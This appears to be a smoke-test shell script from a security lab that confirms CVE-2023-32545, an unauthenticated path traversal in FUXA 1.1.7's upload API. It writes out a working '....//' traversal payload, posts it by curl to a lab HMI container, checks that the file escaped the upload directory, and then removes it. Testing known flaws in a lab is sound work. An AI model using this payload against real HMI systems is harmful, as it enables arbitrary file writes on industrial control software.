#!/usr/bin/env bash
# CVE-2023-32545. FUXA 1.1.7's /api/upload sanitizes filenames with
# `name.replace(new RegExp('../', 'g'), '')` which is a single-pass any-any-/
# regex. A payload like `....//....//....//....//....//....//<file>` survives
# sanitization as `../../../../../../<file>` and lands wherever path.join
# resolves. No auth on the route at all.
#
# Coverage:
#   Stage 1  :1881 reachable from eng-ws
#   Stage 2  POST /api/upload with a traversal payload returns 200
#   Stage 3  the file lands outside _upload_files (under /usr/...)
#   Stage 4  cleanup, file is removed from the HMI container
#
# Usage: bash tests/smoke/test_fuxa_path_traversal.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENG_WS="uupl-eng-ws"
FUXA_IP="10.10.3.10"
FUXA_PORT=1881
FUXA_CONTAINER="uupl-hmi"

require_running "$ENG_WS"
require_running "$FUXA_CONTAINER"

echo "[fuxa-trav] Stage 0: FUXA :$FUXA_PORT reachable from eng-ws"
if ! wait_for_port "$ENG_WS" "$FUXA_IP" "$FUXA_PORT" 10; then
    echo "  [skip] FUXA :$FUXA_PORT not reachable; lab needs './ctl down && ./ctl up'."
    exit 2
fi
ok "FUXA :$FUXA_PORT reachable"

echo "[fuxa-trav] Stage 2: POST /api/upload with traversal payload"
# Random tag in the filename so re-runs don't collide with leftover files.
TAG="trav_$(date +%s%N | head -c 16)"
# Payload: 6 levels of `....//` (each becomes `../` after the broken
# sanitizer's single pass), then the filename. The filename uses no `/`
# so the sanitizer's any-any-/ regex cannot eat into it.
NAME="....//....//....//....//....//....//${TAG}_fuxa_pwn.txt"
BODY='{"name":"'"$NAME"'","type":"text","data":"data:text/plain;base64,UFdORUQ="}'
RESP="$(in_container "$ENG_WS" curl -s -X POST \
    -H 'Content-Type: application/json' \
    -d "$BODY" \
    "http://$FUXA_IP:$FUXA_PORT/api/upload")"
assert_contains "$RESP" '"location"' "upload returned a location, server accepted the write"

echo "[fuxa-trav] Stage 3: file landed outside _upload_files"
# Find the file in the HMI container, exclude paths under the legitimate
# upload directory to prove the traversal actually escaped.
LANDED="$(docker exec "$FUXA_CONTAINER" find / -name "*${TAG}_fuxa_pwn*" -type f 2>/dev/null | grep -v '_upload_files' | head -1)"
[ -n "$LANDED" ] || fail "no file matching tag $TAG found outside _upload_files"
ok "file landed at: $LANDED"
assert_absent "$LANDED" "_upload_files" "landed path is not under the legitimate upload dir"

echo "[fuxa-trav] Stage 4: cleanup"
docker exec "$FUXA_CONTAINER" rm -f "$LANDED" >/dev/null 2>&1 || true
STILL="$(docker exec "$FUXA_CONTAINER" find / -name "*${TAG}_fuxa_pwn*" -type f 2>/dev/null | head -1)"
[ -z "$STILL" ] && ok "traversal file removed" || fail "traversal file still present: $STILL"

summary
